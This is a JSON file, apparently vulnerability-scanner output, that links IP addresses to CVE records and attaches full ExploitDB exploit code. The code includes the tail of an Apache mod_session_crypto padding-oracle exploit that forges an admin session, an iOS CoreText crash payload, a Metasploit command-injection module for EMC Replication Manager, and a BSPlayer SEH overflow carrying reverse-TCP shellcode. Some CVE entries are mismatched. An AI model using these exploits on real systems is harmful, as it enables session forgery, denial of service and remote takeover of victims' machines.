s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
                "description": "Apache mod_session_crypto - Padding Oracle",
                "author": "RedTeam Pentesting GmbH",
                "_id": 40961,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-12-23T00:00:00+00:00",
                "cve": [
                    "CVE-2016-0736"
                ],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2015-3185": [
            {
                "source": "CVE",
                "_id": "2015-3185",
                "description": "The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",
                "osvdb": [],
                "bid": [
                    75965
                ],
                "cve": [
                    "CVE-2015-3185"
                ],
                "msb": []
            }
        ],
        "CVE-2015-3184": [
            {
                "source": "CVE",
                "_id": "2015-3184",
                "description": "mod_authz_svn in Apache Subversion 1.7.x before 1.7.21 and 1.8.x before 1.8.14, when using Apache httpd 2.4.x, does not properly restrict anonymous access, which allows remote anonymous users to read hidden files via the path name.",
                "osvdb": [],
                "bid": [
                    76274
                ],
                "cve": [
                    "CVE-2015-3184"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ],
        "CVE-2016-4975": [
            {
                "source": "CVE",
                "_id": "2016-4975",
                "description": "Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the \"Location\" or other outbound header key or value. Fixed in Apache HTTP Server 2.4.25 (Affected 2.4.1-2.4.23). Fixed in Apache HTTP Server 2.2.32 (Affected 2.2.0-2.2.31).",
                "osvdb": [],
                "bid": [
                    105093
                ],
                "cve": [
                    "CVE-2016-4975"
                ],
                "msb": []
            }
        ],
        "CVE-2016-8612": [
            {
                "source": "CVE",
                "_id": "2016-8612",
                "description": "Apache HTTP Server mod_cluster before version httpd 2.4.23 is vulnerable to an Improper Input Validation in the protocol parsing logic in the load balancer resulting in a Segmentation Fault in the serving httpd process.",
                "osvdb": [],
                "bid": [
                    94939
                ],
                "cve": [
                    "CVE-2016-8612"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-8612",
                "description": "A Denial Of Service vulnerability exists when Connected User Experiences and Telemetry Service fails to validate certain function values, aka \"Connected User Experiences and Telemetry Service Denial of Service Vulnerability.\" This affects Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.",
                "osvdb": [],
                "bid": [
                    106087
                ],
                "cve": [
                    "CVE-2018-8612"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0226": [
            {
                "source": "CVE",
                "_id": "2014-0226",
                "description": "Race condition in the mod_status module in the Apache HTTP Server before 2.4.10 allows remote attackers to cause a denial of service (heap-based buffer overflow), or possibly obtain sensitive credential information or execute arbitrary code, via a crafted request that triggers improper scoreboard handling within the status_handler function in modules/generators/mod_status.c and the lua_ap_scoreboard_worker function in modules/lua/lua_request.c.",
                "osvdb": [
                    109216
                ],
                "bid": [
                    68678
                ],
                "cve": [
                    "CVE-2014-0226"
                ],
                "msb": []
            }
        ],
        "CVE-2014-3523": [
            {
                "source": "CVE",
                "_id": "2014-3523",
                "description": "Memory leak in the winnt_accept function in server/mpm/winnt/child.c in the WinNT MPM in the Apache HTTP Server 2.4.x before 2.4.10 on Windows, when the default AcceptFilter is enabled, allows remote attackers to cause a denial of service (memory consumption) via crafted requests.",
                "osvdb": [],
                "bid": [
                    68747
                ],
                "cve": [
                    "CVE-2014-3523"
                ],
                "msb": []
            }
        ]
    },
    "152.1.84.15": {
        "CVE-2010-2068": [
            {
                "source": "CVE",
                "_id": "2010-2791",
                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
                "osvdb": [],
                "bid": [
                    42102
                ],
                "cve": [
                    "CVE-2010-2791"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2010-2068",
                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
                "osvdb": [],
                "bid": [
                    40827
                ],
                "cve": [
                    "CVE-2010-2068"
                ],
                "msb": []
            }
        ]
    },
    "152.1.84.186": {
        "CVE-2017-7679": [
            {
                "source": "CVE",
                "_id": "2017-7679",
                "description": "In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header.",
                "osvdb": [],
                "bid": [
                    99170
                ],
                "cve": [
                    "CVE-2017-7679"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: TpwnT - iOS Denail of Service POC\r\n# Date: 10-31-2017\r\n# Exploit Author: Russian Otter (Ro)\r\n# Vendor Homepage: https://support.apple.com/en-us/HT208222\r\n# Version: 2.1\r\n# Tested on: iOS 10.3.2 - 11.1\r\n# CVE: CVE-2017-13849\r\n\r\n\"\"\"\r\n-------------------------\r\n     CVE-2017-13849\r\n  TpwnT by Ro of SavSec\r\n-------------------------\r\n\r\nDescription:\r\n\tThread Pwning Text (TpwnT) is maliciously crafted text that affects the iPhone and other Apple devices by exploiting a vulnerability found in the Core-Text firmware which results in a thread crash or extreme application lag!\r\n\r\nRecorded Tests / Results:\r\n\tSignal version 2.14.1 on iOS 10.3.2 (fixed on 2.15.3) users were able to crash conversations by sending the payload which would result in the app crashing when the selected chat was opened.\r\n\t\r\n\tInstagram version 10.25 (fixed on 10.31) on iOS 10.3.2 and resulting in chat thread crashes when the payload was sent which disallowed users to load chat or send messages. When the payload was unsent the chat was fuctional.\r\n\t\r\n\tPythonista 3 on iOS 10.3.2, crashed when displaying multiple sets of TpwnT or while rotating the device.\r\n\t\r\nSummary:\r\n\tWhen displaying the TpwnT Characters on iOS < 11.1 the iPhone may lag intensely or crash on certain apps!\r\n\tThis allows for the possibility of DoS related attacks or application crashing attacks.\r\n\r\nCreator: @Russian_Otter (Ro)\r\nDiscovery: 7-17-2017\r\nDisclosure: 10-31-2017\r\nDisclosure Page: https://support.apple.com/en-us/HT208222\r\n\r\nAffected Devices\r\n\tiPhone 5S iOS < 11.1\r\n\tiPhone 6 & 6S iOS < 11.1\r\n\tiPhone 7 iOS < 11.1\r\n\tiPhone 8 iOS < 11.1\r\n\tiPhone X iOS < 11.1\r\n\tApple TV 4th Generation\r\n\tApple TV 4K 4th Generation\r\n\tiPod Touch 6th Generation\r\n\tiPad Air\r\n\twatchOS < 4.1\r\n\ttvOS < 11.1\r\n\tiOS < 11.1\r\n\r\nTested Devices:\r\n\tiPhone 5S iOS 10.3.2 - 11.1\r\n\tiPhone 6S iOS 10.3.1 - 11.1\r\n\tiPad Mini 2 iOS 10.3.2\r\n\tApple TV 2 tvOS 10\r\n\r\nTested Apps:\r\n\tSignal\r\n\tInstagram\r\n\tSnapchat\r\n\tSafari\r\n\tTanktastic\r\n\tPythonista 3\r\n\tNotepad\r\n\r\n\"\"\"\r\n\r\ntpwnt = \"880 881 883 887 888 975 1159 1275 1276 1277 1278 1302 1304 1305 1306 1311 1313 1314 1316 1317 1318 1319 1322 1323 1324 1325 1326 1327 1328 1543 2304 2405 3073 3559 3585 3586 4091 4183 4184 4353 6366 6798 7679 7680 7837 7930 7932 7933 7934 7935 7936 8343 8344 8345 8346 8347 8348 8349 8376 8381 8382 8383 8384 8524 9136 9169 10215 10216 11153 11374 11377 11381 11390 11392 11746 11747 11748 11749 11750 11751 11752 11753 11754 11755 11756 11757 11758 11759 11760 11761 11762 11763 11764 11765 11766 11767 11768 11769 11771 11772 11773 11774 11775 11776 11811 11813 11814 12295 12344 12357 12686 19971 19975 42560 42562 42563 42564 42565 42566 42567 42568 42569 42570 42571 42572 42573 42574 42575 42576 42577 42578 42579 42580 42581 42583 42584 42585 42587 42588 42589 42590 42591 42592 42594 42595 42596 42597 42598 42599 42600 42601 42602 42603 42604 42605 42606 42608 42609 42610 42611 42612 42613 42614 42615 42616 42617 42619 42620 42621 42622 42623 42624 42625 42627 42628 42629 42630 42632 42633 42634\".split()\r\n\r\npayload = \"\"\r\nfor i in tpwnt:\r\n\ts = unichr(int(i))\r\n\tpayload += s\r\n\r\npayload = bytes(payload)\r\npayload_unicode = unicode(payload)\r\n\r\n# Proof of Concept\r\n# iOS < 11.1 Devices that display these characters should experience lag or crashes while TpwnT is visible\r\n\r\nif raw_input(\"Show Payload [y/n] \") == \"y\":\r\n\tprint payload_unicode",
                "description": "iOS < 11.1 / tvOS < 11.1 / watchOS < 4.1 - Denial of Service",
                "author": "Russian Otter",
                "_id": 43161,
                "source": "ExploitDB",
                "platform": "ios",
                "date": "2017-11-20T00:00:00+00:00",
                "cve": [
                    "CVE-2017-13849"
                ],
                "type": "dos",
                "port": 0
            }
        ]
    },
    "152.1.95.84": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.105.82": {
        "CVE-2009-1524": [
            {
                "source": "CVE",
                "_id": "2009-1524",
                "description": "Cross-site scripting (XSS) vulnerability in Mort Bay Jetty before 6.1.17 allows remote attackers to inject arbitrary web script or HTML via a directory listing request containing a ; (semicolon) character.",
                "osvdb": [],
                "bid": [
                    34800
                ],
                "cve": [
                    "CVE-2009-1524"
                ],
                "msb": []
            }
        ],
        "CVE-2011-4461": [
            {
                "source": "CVE",
                "_id": "2011-5034",
                "description": "Apache Geronimo 2.2.1 and earlier computes hash values for form parameters without restricting the ability to trigger hash collisions predictably, which allows remote attackers to cause a denial of service (CPU consumption) by sending many crafted parameters.  NOTE: this might overlap CVE-2011-4461.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-5034"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4461",
                "description": "Jetty 8.1.0.RC2 and earlier computes hash values for form parameters without restricting the ability to trigger hash collisions predictably, which allows remote attackers to cause a denial of service (CPU consumption) by sending many crafted parameters.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4461"
                ],
                "msb": []
            }
        ]
    },
    "152.1.109.12": {
        "CVE-2011-5000": [
            {
                "source": "CVE",
                "_id": "2011-5000",
                "description": "The ssh_gssapi_parse_ename function in gss-serv.c in OpenSSH 5.8 and earlier, when gssapi-with-mic authentication is enabled, allows remote authenticated users to cause a denial of service (memory consumption) via a large value in a certain length field.  NOTE: there may be limited scenarios in which this issue is relevant.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-5000"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4487",
                "description": "SQL injection vulnerability in Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allows remote attackers to execute arbitrary SQL commands via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4487"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-2581",
                "description": "The ACL implementation in Cisco NX-OS 5.0(2) and 5.0(3) before 5.0(3)N2(1) on Nexus 5000 series switches, and NX-OS before 5.0(3)U1(2a) on Nexus 3000 series switches, does not properly handle comments in conjunction with deny statements, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by sending packets, aka Bug IDs CSCto09813 and CSCtr61490.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-2581"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4486",
                "description": "Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allow remote attackers to cause a denial of service (device reload) via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4486"
                ],
                "msb": []
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = GreatRanking\r\n\r\n  include Msf::Exploit::Remote::Tcp\r\n  include Msf::Exploit::CmdStager\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      'Name'           => 'EMC Replication Manager Command Execution',\r\n      'Description'    => %q{\r\n        This module exploits a remote command-injection vulnerability in EMC Replication Manager\r\n        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an\r\n        attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected\r\n        products are EMC Replication Manager < 5.3. This module has been successfully tested\r\n        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft\r\n        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested\r\n        against these products.\r\n      },\r\n      'Author'         =>\r\n        [\r\n          'Unknown', #Initial discovery\r\n          'Davy Douhine' #MSF module\r\n        ],\r\n      'License'        => MSF_LICENSE,\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2011-0647' ],\r\n          [ 'OSVDB', '70853' ],\r\n          [ 'BID', '46235' ],\r\n          [ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],\r\n          [ 'ZDI', '11-061' ]\r\n        ],\r\n      'DisclosureDate' => 'Feb 07 2011',\r\n      'Platform'       => 'win',\r\n      'Arch'           => ARCH_X86,\r\n      'Payload'        =>\r\n        {\r\n          'Space'       => 4096,\r\n          'DisableNops' => true\r\n        },\r\n      'Targets'        =>\r\n        [\r\n          # Tested on Windows XP and Windows 2003\r\n          [ 'EMC Replication Manager 5.2.1 / Windows Native Payload', { } ]\r\n        ],\r\n      'CmdStagerFlavor' => 'vbs',\r\n      'DefaultOptions' =>\r\n        {\r\n          'WfsDelay' => 5\r\n        },\r\n      'DefaultTarget'  => 0,\r\n      'Privileged'     => true\r\n      ))\r\n\r\n    register_options(\r\n      [\r\n        Opt::RPORT(6542)\r\n      ], self.class)\r\n  end\r\n\r\n  def exploit\r\n    execute_cmdstager({:linemax => 5000})\r\n  end\r\n\r\n  def execute_command(cmd, opts)\r\n    connect\r\n    hello = \"1HELLOEMC00000000000000000000000\"\r\n    vprint_status(\"Sending hello...\")\r\n    sock.put(hello)\r\n    result = sock.get_once || ''\r\n    if result =~ /RAWHELLO/\r\n      vprint_good(\"Expected hello response\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to hello the server\")\r\n    end\r\n\r\n    start_session = \"EMC_Len0000000136<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><ir_message ir_sessionId=0000 ir_type=\\\"ClientStartSession\\\" <ir_version>1</ir_version></ir_message>\"\r\n    vprint_status(\"Starting session...\")\r\n    sock.put(start_session)\r\n    result = sock.get_once || ''\r\n    if result =~ /EMC/\r\n      vprint_good(\"A session has been created. Good.\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to create the session\")\r\n    end\r\n\r\n    run_prog = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?> \"\r\n    run_prog << \"<ir_message ir_sessionId=\\\"01111\\\" ir_requestId=\\\"00000\\\" ir_type=\\\"RunProgram\\\" ir_status=\\\"0\\\"><ir_runProgramCommand>cmd /c #{cmd}</ir_runProgramCommand>\"\r\n    run_prog << \"<ir_runProgramAppInfo><?xml version=\"1.0\" encoding=\"UTF-8\"?> <ir_message ir_sessionId=\"00000\" ir_requestId=\"00000\" \"\r\n    run_prog << \"ir_type=\"App Info\" ir_status=\"0\"><IR_groupEntry IR_groupType=\"anywriter\"  IR_groupName=\"CM1109A1\"  IR_groupId=\"1\" \"\r\n    run_prog << \"><?xml version=\"1.0\" encoding=\"UTF-8\"?\t> <ir_message ir_sessionId=\"00000\" \"\r\n    run_prog << \"ir_requestId=\"00000\"ir_type=\"App Info\" ir_status=\"0\"><aa_anywriter_ccr_node>CM1109A1\"\r\n    run_prog << \"</aa_anywriter_ccr_node><aa_anywriter_fail_1018>0</aa_anywriter_fail_1018><aa_anywriter_fail_1019>0\"\r\n    run_prog << \"</aa_anywriter_fail_1019><aa_anywriter_fail_1022>0</aa_anywriter_fail_1022><aa_anywriter_runeseutil>1\"\r\n    run_prog << \"</aa_anywriter_runeseutil><aa_anywriter_ccr_role>2</aa_anywriter_ccr_role><aa_anywriter_prescript>\"\r\n    run_prog << \"</aa_anywriter_prescript><aa_anywriter_postscript></aa_anywriter_postscript><aa_anywriter_backuptype>1\"\r\n    run_prog << \"</aa_anywriter_backuptype><aa_anywriter_fail_447>0</aa_anywriter_fail_447><aa_anywriter_fail_448>0\"\r\n    run_prog << \"</aa_anywriter_fail_448><aa_exchange_ignore_all>0</aa_exchange_ignore_all><aa_anywriter_sthread_eseutil>0&amp\"\r\n    run_prog << \";lt;/aa_anywriter_sthread_eseutil><aa_anywriter_required_logs>0</aa_anywriter_required_logs><aa_anywriter_required_logs_path\"\r\n    run_prog << \"></aa_anywriter_required_logs_path><aa_anywriter_throttle>1</aa_anywriter_throttle><aa_anywriter_throttle_ios>300\"\r\n    run_prog << \"</aa_anywriter_throttle_ios><aa_anywriter_throttle_dur>1000</aa_anywriter_throttle_dur><aa_backup_username>\"\r\n    run_prog << \"</aa_backup_username><aa_backup_password></aa_backup_password><aa_exchange_checksince>1335208339\"\r\n    run_prog << \"</aa_exchange_checksince> </ir_message></IR_groupEntry> </ir_message></ir_runProgramAppInfo>\"\r\n    run_prog << \"<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>\"\r\n    run_prog_header = \"EMC_Len000000\"\r\n    run_prog_packet = run_prog_header + run_prog.length.to_s + run_prog\r\n\r\n    vprint_status(\"Executing command....\")\r\n    sock.put(run_prog_packet)\r\n    sock.get_once(-1, 1)\r\n\r\n    end_string = Rex::Text.rand_text_alpha(rand(10)+32)\r\n    sock.put(end_string)\r\n    sock.get_once(-1, 1)\r\n    disconnect\r\n\r\n  end\r\nend",
                "description": "EMC Replication Manager < 5.3 - Command Execution (Metasploit)",
                "author": "Metasploit",
                "_id": 41704,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-02-27T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "#\r\n#\r\n#[+]Exploit Title: Exploit Buffer Overfloe Bsplayer 2.57(UNICODE-SEH)\r\n#[+]Date: 01\\07\\2010\r\n#[+]Author: C4SS!0 G0M3S\r\n#[+]Software Link: http://www.bsplayer.com/services/downlad-free-bsplayer.php?type=2\r\n#[+]Version: 2.57\r\n#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN\r\n#[+]CVE: N/A\r\n#\r\n#\r\n#  #########      ##   #########      #########  ##     ###############\r\n#  #########    ####   #########      #########  ##     ##           ##    \r\n#  ##         ## ##    ##             ##         ##     ##           ## \r\n#  ##        ##  ##    ##             ##         ##     ##           ##\r\n#  ##       ########## ########       ########   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ########      ##    ########      #########   ##     ##           ##\r\n#  ########      ##    ########      #########   \\/     ###############\r\n#                                              \r\n#Created By C4SS!0 G0M3S\r\n#Louredo_@hotmail.com\r\n#www.invasao.com.br\r\n#\r\n#\r\n\r\n\r\nimport os\r\nimport sys\r\nimport time\r\nimport string\r\n\r\nos.system(\"cls\")\r\nos.system(\"color 4f\")\r\n\r\ndef usage():\r\n        print \"\\n\"\r\n        print \"[+]Exploit: Exploit Buffer Overflow Bsplayer(UNICODE-SEH)\"\r\n        print \"[+]Date: 01\\\\07\\\\2010\"\r\n        print \"[+]Author: C4SS!0 G0M3S\"\r\n        print \"[+]Home: www.invasao.com.br\"\r\n        print \"[+]E-mail: Louredo_@hotmail.com\"\r\n        print \"[+]Version: 2.57\"\r\n        print \"[+]Software: Bsplayer 2.57\\n\"\r\n        print \"[-]Note:\"\r\n        print \"TO EXPLOIT THE RUN FILE NAME MUST BE FILE_NAME.M3U\\n\"\r\n\r\n\r\nif((len(sys.argv)!=3) or (int(sys.argv[1])<1) or (int(sys.argv[1])>2)):\r\n        usage()\r\n        print \"Payloads:\\n1 - WinExec(\\\"Calc.exe\\\",0)\\n2 - Reverse_Tcp_Shell\\n\"\r\n        print \"[-]Usage: \"+sys.argv[0]+\" <Playload Number> <File Name>\"\r\n        print \"[-]Exemple: \"+sys.argv[0]+\" 1 Exploit.m3u\"\r\n        sys.exit(0)\r\n\r\nusage()\r\nbuffer = \"\\x42\" * 4102\r\nnseh = \"\\x61\\x6d\"\r\nseh = \"\\xde\\x4e\" #pop ebx - pop ebp - ret at 0x004E00DE [bsplayer.exe]\r\negg_hunter = \"\\x45\\x61\\x45\\x61\\x45\\x50\\x45\\xc3\"\r\n\r\njunk = \"\\x45\" * 1094\r\nprint \"[*]Identifying the length Shellcode\"\r\ntime.sleep(1)\r\nif int(sys.argv[1]) == 2:\r\n\tshellcode = (\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n\t\"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBNKWY7N4PV9X6PQX1PV9JYNZ9SDMTZTR\" # \r\n\t\"83SY0KT01RPLLLCBPLLT2RLPJX9KKTOX3NZUKKV0VLK3Y3MLRONMMJU2VWC8VQKQSOPTZT3CTK1LPUR6\" #\r\n\t\"KZR65RJC7NPWDLVRZQUMFMV85BXR7BOG8SCKUNXUVMVGIPMKJJZ6XSQ40ORI2UTOWNWRXVF679XJWYPL\" #FROM METASPLOIT FRAMEWORK \r\n\t\"OU2QOXQNN0GGLNM3HJLRVWUSKO4OWMVOZKXLKLY2B3U1BQMPEBVMQEEFULKP12N8GHWH43CROTS2NPPD\" #\r\n\t\"QT0YXLS5MOM3OCKSRWPFLJWWN19PSXXOFKYD7KLN3WYMFFEJY7LO785W6C1TM7MOURUH7EOM1FZTEMOJ\" #SHELLCODE REVERSE_TCP_SHELL ON PORT 4444\r\n\t\"28TUN2LK0SKNTKKPHJSDRKLFONNC2620QXQTRFZUE3UGR8TOL5V3YO47PRSMMBURNNL9MNEHNELX5NOW\" #\r\n\t\"Q8C5UPOLK3BIRSQBOXVDD9STOI8LHBM1Y3PEPOKMQOMKRN8JZIJ3MPJ0VRRYY92VP0DLVJ3TVJFWKSKB\" #PROMPT:\r\n\t\"QCMXW7O30CRZRF7JK7JV4S2SRM9M5RRTOZZVFYQQDKKW1LY7S6LZFJLLZNXMJB685QOJGLNKNITOCZSK\" #\r\n\t\"QITVVPONFL6LN0O1RVBINM6OLML4XL0TNL6RRVN28UOKSULQJXYLLY9NLM57LVDS8NY2PMQ3MORRMHQD\" #C:\\>Telnet 127.0.0.1 4444\r\n\t\"BEINV9QY8U0MN1ZTUPPO3KGMVDOQWLNEUOJLWKE6UPNMBX12QURRNVJN78DYMXKOMHNA\")            # \r\n                                                                                       #\r\nif int(sys.argv[1]) == 1:\r\n        shellcode = (\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ\"\r\n        \"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBIKY0NQ99GO3LLVRPHLXY2TMTL46QMNR\"\r\n        \"8P1SHN853YXKLKSSHQXL4TENPSHWL3599RX6VNCJUKCH4VNSMM25ZOJP2MLWORBZMMM1DJ5QVO9MQ9W4\"\r\n        \"V30ZUBQWZLFP5KELTXGCLKKMKLE2KZPNG9MOXKMNBNXMKVBK893KGOKSJXOPLPOMS8SR3UTPWKGHXOKT\"\r\n        \"CDN4CMOQG1C34R171NSXML5WVKE7QSN4XL5VJZQM5W8O669OMOK90J9KN0Q31VVLNNOCUN957X7SHNOP\"\r\n        